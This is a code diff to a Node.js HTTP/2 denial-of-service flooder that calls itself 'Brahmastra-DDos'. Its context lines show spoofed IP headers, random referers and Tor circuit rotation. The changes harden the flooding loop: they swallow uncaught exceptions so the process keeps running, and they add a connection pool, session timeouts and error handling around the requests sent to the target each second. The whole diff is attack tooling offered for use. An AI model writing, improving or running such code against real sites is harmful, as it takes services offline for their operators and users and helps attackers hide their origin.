@@ -1,4 +1,24 @@
 const net = require("net");
+
+// Global error handler to prevent crashes
+process.on('uncaughtException', (err) => {
+    // Log the error but don't crash
+    if (err.message && err.message.includes('session has been destroyed')) {
+        // This is expected when sessions are destroyed, just log it
+        console.log(`[INFO] Session destroyed - continuing operation`);
+    } else if (err.message && err.message.includes('ERR_HTTP2_INVALID_SESSION')) {
+        // This is expected when HTTP/2 sessions are invalid, just log it
+        console.log(`[INFO] HTTP/2 session invalid - continuing operation`);
+    } else {
+        // Log unexpected errors
+        console.log(`[WARNING] Uncaught exception: ${err.message}`);
+    }
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    // Log unhandled promise rejections but don't crash
+    console.log(`[WARNING] Unhandled promise rejection: ${reason}`);
+});
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
@@ -514,10 +534,16 @@ if (cluster.isMaster) {
     }
     
     setInterval(getStatus, 2000);
-    setTimeout(() => {
-      console.log(`[\x1b[35mBrahmastra-DDos\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
-      process.exit(1);
-    }, process.argv[3] * 1000);
+         setTimeout(() => {
+       console.log(`[\x1b[35mBrahmastra-DDos\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
+       
+       // Clean up all connections before exiting
+       if (typeof connectionPool !== 'undefined' && connectionPool.cleanup) {
+           connectionPool.cleanup();
+       }
+       
+       process.exit(1);
+     }, process.argv[3] * 1000);
   }
 } else if (!isDemoMode) {
   // Only run flooder in worker processes if not in demo mode
@@ -1367,7 +1393,44 @@ headers["Real-IP"] = fakeIP;
 headers["Referer"] = randomReferer;
 
  
- function runFlooder() {
+ // Connection pool to manage HTTP/2 sessions
+const connectionPool = {
+    maxConnections: 10,
+    activeConnections: 0,
+    connections: new Set(),
+    
+    canCreateConnection() {
+        return this.activeConnections < this.maxConnections;
+    },
+    
+    addConnection(connection) {
+        this.connections.add(connection);
+        this.activeConnections++;
+    },
+    
+    removeConnection(connection) {
+        if (this.connections.has(connection)) {
+            this.connections.delete(connection);
+            this.activeConnections--;
+        }
+    },
+    
+    cleanup() {
+        this.connections.forEach(conn => {
+            try {
+                if (conn && !conn.destroyed) {
+                    conn.destroy();
+                }
+            } catch (err) {
+                // Ignore cleanup errors
+            }
+        });
+        this.connections.clear();
+        this.activeConnections = 0;
+    }
+};
+
+function runFlooder() {
     // Rotate Tor circuit if enabled
     if (isTorEnabled) {
         torManager.rotateCircuit();
@@ -1456,7 +1519,31 @@ headers["Referer"] = randomReferer;
             }
         }
 
+        // Check if we can create a new connection
+        if (!connectionPool.canCreateConnection()) {
+            console.log(`[INFO] Connection pool full, skipping connection creation`);
+            return;
+        }
+
         const client = http2.connect(parsedTarget.href, http2Options);
+        
+        // Add to connection pool
+        connectionPool.addConnection(client);
+
+        // Set session timeout to prevent hanging
+        const sessionTimeout = setTimeout(() => {
+            isSessionValid = false;
+            if (attackInterval) {
+                clearInterval(attackInterval);
+            }
+            try {
+                connectionPool.removeConnection(client);
+                client.destroy();
+                connection.destroy();
+            } catch (err) {
+                // Ignore destroy errors
+            }
+        }, 30000); // 30 second timeout
 
         client.settings({
            headerTableSize: 65536,
@@ -1466,32 +1553,93 @@ headers["Referer"] = randomReferer;
            enablePush: false
          });
 
+        let isSessionValid = true;
+        let attackInterval = null;
+
         client.on("connect", () => {
-           const IntervalAttack = setInterval(() => {
-                               for (let i = 0; i < args.rate; i++) {
-                   const request = client.request(headers)
-                   
-                   .on("response", response => {
-                       request.close();
-                       request.destroy();
-                       return
-                   });
+           attackInterval = setInterval(() => {
+               // Check if session is still valid before making requests
+               if (!isSessionValid || client.destroyed || client.closed || !client.connecting) {
+                   clearInterval(attackInterval);
+                   return;
+               }
+               
+               try {
+                   for (let i = 0; i < args.rate; i++) {
+                       // Double-check session validity before each request
+                       if (!isSessionValid || client.destroyed || client.closed || !client.connecting) {
+                           break;
+                       }
+                       
+                       // Additional safety check before creating request
+                       if (!client || typeof client.request !== 'function') {
+                           isSessionValid = false;
+                           break;
+                       }
+                       
+                       const request = client.request(headers);
+                       
+                       request.on("response", response => {
+                           try {
+                               request.close();
+                               request.destroy();
+                           } catch (err) {
+                               // Ignore errors when destroying request
+                           }
+                       });
+                       
+                       request.on("error", (err) => {
+                           // Handle request errors gracefully
+                           try {
+                               request.close();
+                               request.destroy();
+                           } catch (destroyErr) {
+                               // Ignore destroy errors
+                           }
+                       });
        
-                   request.end();
+                       request.end();
+                   }
+               } catch (err) {
+                   // If there's an error, mark session as invalid
+                   isSessionValid = false;
+                   clearInterval(attackInterval);
                }
            }, 1000); 
         });
 
         client.on("close", () => {
-            client.destroy();
-            connection.destroy();
-            return
+            isSessionValid = false;
+            if (attackInterval) {
+                clearInterval(attackInterval);
+            }
+            if (sessionTimeout) {
+                clearTimeout(sessionTimeout);
+            }
+            try {
+                connectionPool.removeConnection(client);
+                client.destroy();
+                connection.destroy();
+            } catch (err) {
+                // Ignore destroy errors
+            }
         });
 
         client.on("error", error => {
-            client.destroy();
-            connection.destroy();
-            return
+            isSessionValid = false;
+            if (attackInterval) {
+                clearInterval(attackInterval);
+            }
+            if (sessionTimeout) {
+                clearTimeout(sessionTimeout);
+            }
+            try {
+                connectionPool.removeConnection(client);
+                client.destroy();
+                connection.destroy();
+            } catch (err) {
+                // Ignore destroy errors
+            }
         });
     });
  }
